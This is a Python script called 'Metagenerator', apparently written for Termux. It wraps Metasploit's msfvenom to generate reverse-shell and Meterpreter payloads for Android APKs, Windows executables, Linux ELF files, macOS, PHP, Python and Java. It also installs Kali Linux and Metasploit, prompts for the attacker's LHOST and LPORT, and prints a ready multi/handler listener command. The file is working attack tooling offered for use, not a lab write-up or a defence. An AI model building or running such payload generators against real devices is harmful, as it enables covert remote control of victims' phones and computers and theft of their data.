#!/usr/bin/env python3
# ╔══════════════════════════════════════════════╗
# ║          M E T A G E N E R A T O R          ║
# ║         msfvenom payload generator          ║
# ║              by flandreiii                  ║
# ╚══════════════════════════════════════════════╝

import os
import sys
import subprocess
import shutil
import time

# ─── colors ───────────────────────────────────────────────────────────────────
R  = "\033[0m"
G  = "\033[32m"
Y  = "\033[33m"
C  = "\033[36m"
RE = "\033[31m"
B  = "\033[1m"
DG = "\033[90m"

# ─── payloads ─────────────────────────────────────────────────────────────────
PAYLOADS = [
    # Android
    ("android/meterpreter/reverse_tcp",      "Android",  "APK reverse shell (TCP)"),
    ("android/meterpreter/reverse_https",    "Android",  "APK reverse shell (HTTPS)"),
    ("android/shell/reverse_tcp",            "Android",  "APK dumb shell (TCP)"),

    # Windows
    ("windows/meterpreter/reverse_tcp",      "Windows",  "Windows x86 Meterpreter reverse TCP"),
    ("windows/meterpreter/reverse_https",    "Windows",  "Windows x86 Meterpreter reverse HTTPS"),
    ("windows/meterpreter/bind_tcp",         "Windows",  "Windows x86 Meterpreter bind TCP"),
    ("windows/shell_reverse_tcp",            "Windows",  "Windows x86 dumb shell reverse TCP"),
    ("windows/x64/meterpreter/reverse_tcp",  "Windows",  "Windows x64 Meterpreter reverse TCP"),
    ("windows/x64/meterpreter/reverse_https","Windows",  "Windows x64 Meterpreter reverse HTTPS"),
    ("windows/x64/shell_reverse_tcp",        "Windows",  "Windows x64 dumb shell reverse TCP"),
    ("windows/x64/powershell_reverse_tcp",   "Windows",  "Windows x64 PowerShell reverse TCP"),

    # Linux
    ("linux/x86/meterpreter/reverse_tcp",    "Linux",    "Linux x86 Meterpreter reverse TCP"),
    ("linux/x64/meterpreter/reverse_tcp",    "Linux",    "Linux x64 Meterpreter reverse TCP"),
    ("linux/x86/shell_reverse_tcp",          "Linux",    "Linux x86 dumb shell reverse TCP"),
    ("linux/x64/shell_reverse_tcp",          "Linux",    "Linux x64 dumb shell reverse TCP"),

    # macOS
    ("osx/x64/meterpreter/reverse_tcp",      "macOS",    "macOS x64 Meterpreter reverse TCP"),
    ("osx/x64/shell_reverse_tcp",            "macOS",    "macOS x64 dumb shell reverse TCP"),

    # PHP
    ("php/meterpreter/reverse_tcp",          "PHP",      "PHP Meterpreter reverse TCP"),
    ("php/reverse_php",                      "PHP",      "PHP reverse shell"),

    # Python
    ("python/meterpreter/reverse_tcp",       "Python",   "Python Meterpreter reverse TCP"),
    ("python/shell_reverse_tcp",             "Python",   "Python reverse shell"),

    # Java
    ("java/meterpreter/reverse_tcp",         "Java",     "Java Meterpreter reverse TCP"),
    ("java/shell_reverse_tcp",               "Java",     "Java dumb shell reverse TCP"),
]

FORMAT_MAP = {
    "Android": ("raw",  ".apk"),
    "Windows": ("exe",  ".exe"),
    "Linux":   ("elf",  ".elf"),
    "macOS":   ("macho",".bin"),
    "PHP":     ("raw",  ".php"),
    "Python":  ("raw",  ".py"),
    "Java":    ("jar",  ".jar"),
}

# ─── helpers ──────────────────────────────────────────────────────────────────
def clear():
    os.system("clear")

def banner():
    print(f"""{G}{B}
  ███╗   ███╗███████╗████████╗ █████╗  ██████╗ ███████╗███╗   ██╗
  ████╗ ████║██╔════╝╚══██╔══╝██╔══██╗██╔════╝ ██╔════╝████╗  ██║
  ██╔████╔██║█████╗     ██║   ███████║██║  ███╗█████╗  ██╔██╗ ██║
  ██║╚██╔╝██║██╔══╝     ██║   ██╔══██║██║   ██║██╔══╝  ██║╚██╗██║
  ██║ ╚═╝ ██║███████╗   ██║   ██║  ██║╚██████╔╝███████╗██║ ╚████║
  ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝{R}
{DG}  ─────────────────────────────────────────────────────────────────{R}
{C}           msfvenom payload generator  ·  by {B}flandreiii{R}
{DG}  ─────────────────────────────────────────────────────────────────{R}
""")

def pause():
    input(f"\n{DG}  [ press enter to continue ]{R}")

def is_kali_installed():
    """Check if kali proot env is accessible (kali-fs or similar)."""
    kali_paths = [
        os.path.expanduser("~/kali-fs/usr/bin/msfvenom"),
        "/data/data/com.termux/files/home/kali-fs/usr/bin/msfvenom",
    ]
    for p in kali_paths:
        if os.path.exists(p):
            return p
    # also check if msfvenom is directly in PATH (native install)
    if shutil.which("msfvenom"):
        return shutil.which("msfvenom")
    return None

def run_cmd(cmd, show=True):
    if show:
        print(f"{DG}  » {cmd}{R}\n")
    return subprocess.run(cmd, shell=True)

def install_kali():
    clear()
    banner()
    print(f"{Y}{B}  [ INSTALL ] Kali Linux proot + Metasploit{R}\n")
    print(f"{C}  This will install:{R}")
    print(f"  {DG}·{R} proot-distro (Termux package)")
    print(f"  {DG}·{R} Kali Linux image via proot-distro")
    print(f"  {DG}·{R} metasploit-framework inside Kali")
    print(f"\n{Y}  Note: this may take 20–60 min and ~3–5 GB of space.{R}")
    print(f"{RE}  Make sure you are connected to WiFi!{R}\n")

    confirm = input(f"  {G}Continue? (y/n): {R}").strip().lower()
    if confirm != "y":
        return

    print(f"\n{G}  [1/4] Installing proot-distro...{R}")
    run_cmd("pkg update -y && pkg install -y proot-distro wget")

    print(f"\n{G}  [2/4] Installing Kali Linux (proot)...{R}")
    run_cmd("proot-distro install kali")

    print(f"\n{G}  [3/4] Installing Metasploit inside Kali...{R}")
    msf_script = (
        "proot-distro login kali -- bash -c \""
        "apt update -y && "
        "apt install -y metasploit-framework\""
    )
    run_cmd(msf_script)

    print(f"\n{G}  [4/4] Done! Verifying installation...{R}")
    time.sleep(1)

    # Write a small wrapper so msfvenom is callable from Termux
    wrapper = os.path.expanduser("~/bin/msfvenom")
    os.makedirs(os.path.expanduser("~/bin"), exist_ok=True)
    with open(wrapper, "w") as f:
        f.write("#!/data/data/com.termux/files/usr/bin/bash\n")
        f.write('proot-distro login kali -- msfvenom "$@"\n')
    os.chmod(wrapper, 0o755)

    # Add ~/bin to PATH in .bashrc if not there
    bashrc = os.path.expanduser("~/.bashrc")
    path_line = 'export PATH="$HOME/bin:$PATH"'
    if os.path.exists(bashrc):
        with open(bashrc) as f:
            content = f.read()
        if path_line not in content:
            with open(bashrc, "a") as f:
                f.write(f"\n{path_line}\n")
    else:
        with open(bashrc, "w") as f:
            f.write(f"{path_line}\n")

    print(f"\n{G}{B}  ✓ Installation complete!{R}")
    print(f"  {DG}msfvenom wrapper created at ~/bin/msfvenom{R}")
    print(f"  {Y}Run: source ~/.bashrc  — then restart Metagenerator.{R}")
    pause()

def show_payloads():
    clear()
    banner()
    print(f"  {B}Available Payloads{R}\n")

    current_cat = None
    idx_map = {}
    shown_idx = 1

    for i, (payload, cat, desc) in enumerate(PAYLOADS):
        if cat != current_cat:
            print(f"\n  {C}{B}── {cat} {'─' * (40 - len(cat))}{R}")
            current_cat = cat
        idx_map[shown_idx] = i
        print(f"  {DG}[{R}{G}{shown_idx:>2}{R}{DG}]{R}  {B}{payload}{R}")
        print(f"        {DG}{desc}{R}")
        shown_idx += 1

    return idx_map

def get_output_path(cat, payload_name, fmt_ext):
    safe = payload_name.replace("/", "_")
    default = os.path.expanduser(f"~/metagenerator_{safe}{fmt_ext}")
    print(f"\n  {DG}Output file [{default}]:{R} ", end="")
    inp = input().strip()
    return inp if inp else default

def generate_payload(msfvenom_bin):
    idx_map = show_payloads()
    total = len(PAYLOADS)

    print(f"\n  {DG}──────────────────────────────────────{R}")
    choice = input(f"  {G}Select payload number (1-{total}): {R}").strip()

    if not choice.isdigit() or int(choice) not in idx_map:
        print(f"\n  {RE}Invalid selection.{R}")
        pause()
        return

    payload_idx  = idx_map[int(choice)]
    payload, cat, desc = PAYLOADS[payload_idx]
    fmt, ext = FORMAT_MAP.get(cat, ("raw", ".bin"))

    clear()
    banner()
    print(f"  {B}Selected:{R} {G}{payload}{R}")
    print(f"  {DG}{desc}{R}\n")
    print(f"  {DG}──────────────────────────────────────{R}")

    lhost = input(f"  {C}LHOST (your IP): {R}").strip()
    lport = input(f"  {C}LPORT (your port): {R}").strip()

    if not lhost or not lport:
        print(f"\n  {RE}LHOST and LPORT are required.{R}")
        pause()
        return

    out = get_output_path(cat, payload, ext)

    print(f"\n  {Y}Generating payload...{R}\n")
    time.sleep(0.5)

    # Build command — use proot wrapper if msfvenom is not native
    if "proot-distro" in open(msfvenom_bin).read() if os.path.isfile(msfvenom_bin) and msfvenom_bin.endswith("/msfvenom") else False:
        cmd = (
            f'proot-distro login kali -- msfvenom '
            f'-p {payload} LHOST={lhost} LPORT={lport} '
            f'-f {fmt} -o /tmp/payload_out{ext} 2>&1'
        )
        copy_cmd = f'proot-distro login kali -- cat /tmp/payload_out{ext} > "{out}"'
    else:
        cmd = (
            f'msfvenom -p {payload} LHOST={lhost} LPORT={lport} '
            f'-f {fmt} -o "{out}"'
        )
        copy_cmd = None

    result = subprocess.run(cmd, shell=True)

    if copy_cmd:
        subprocess.run(copy_cmd, shell=True)

    if result.returncode == 0 or os.path.exists(out):
        print(f"\n{G}{B}  ✓ Payload generated!{R}")
        print(f"  {DG}File:{R} {B}{out}{R}")
        print(f"\n  {C}Listener command:{R}")
        print(f"  {DG}msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; run\"{R}")
    else:
        print(f"\n  {RE}Generation failed. Check that Metasploit is installed.{R}")

    pause()

def main_menu(msfvenom_bin):
    while True:
        clear()
        banner()
        status = f"{G}✓ msfvenom found{R}" if msfvenom_bin else f"{RE}✗ msfvenom not found{R}"
        print(f"  Status: {status}\n")
        print(f"  {DG}[{R}{G}1{R}{DG}]{R}  Generate payload")
        print(f"  {DG}[{R}{G}2{R}{DG}]{R}  Install Kali + Metasploit")
        print(f"  {DG}[{R}{G}3{R}{DG}]{R}  Exit")
        print(f"\n  {DG}──────────────────────────────────────{R}")
        choice = input(f"  {G}» {R}").strip()

        if choice == "1":
            if not msfvenom_bin:
                print(f"\n  {RE}msfvenom not found. Install Kali first (option 2).{R}")
                pause()
            else:
                generate_payload(msfvenom_bin)
        elif choice == "2":
            install_kali()
            msfvenom_bin = is_kali_installed()  # re-check after install
        elif choice == "3":
            clear()
            print(f"\n  {DG}bye — flandreiii{R}\n")
            sys.exit(0)

def main():
    clear()
    banner()
    print(f"  {DG}Checking for msfvenom...{R}")
    time.sleep(0.5)

    msfvenom_bin = is_kali_installed()

    if msfvenom_bin:
        print(f"  {G}✓ Found: {msfvenom_bin}{R}")
        time.sleep(0.8)
    else:
        print(f"  {Y}msfvenom not found — you can install it from the menu.{R}")
        time.sleep(1.2)

    main_menu(msfvenom_bin)

if __name__ == "__main__":
    main()
